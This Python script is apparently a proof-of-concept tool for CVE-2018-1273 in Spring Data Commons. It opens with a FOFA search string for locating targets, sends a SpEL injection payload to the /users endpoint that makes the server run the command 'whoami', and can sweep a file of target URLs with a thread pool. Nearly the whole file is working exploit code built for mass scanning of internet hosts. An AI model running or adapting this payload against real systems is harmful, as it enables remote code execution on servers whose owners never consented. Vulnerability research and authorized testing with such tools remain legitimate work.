#FOFA: icon_hash="116323821"

import requests
import re
import argparse
import urllib3
import urllib
from multiprocessing.dummy import Pool
from urllib.parse import urlparse

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'spring 代码执行(CVE-2018-1273)',
        'vulnerable': False
    }
    headers = {
        "Content-type": "application/x-www-form-urlencoded"
    }
    try:
        rep = requests.get(target, timeout=3)
        if re.search('timestamp', rep.text) and re.search('status', rep.text) and rep.status_code == 404:
            vurl = urllib.parse.urljoin(target, '/users')
            payload = '''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")]'''
            payload2 = '''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("aaaaaa")]'''
            rep1 = requests.post(vurl, headers=headers, data=payload, timeout=3)
            rep2 = requests.post(vurl, headers=headers, data=payload2, timeout=3)
            if rep1.status_code == rep2.status_code == 500 and re.search('Invalid property', rep1.text) and re.search('A problem occurred', rep2.text):
                result['vulnerable'] = True
                result['url'] = target
        print(result)
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("CVE-2018-1273spring代码执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()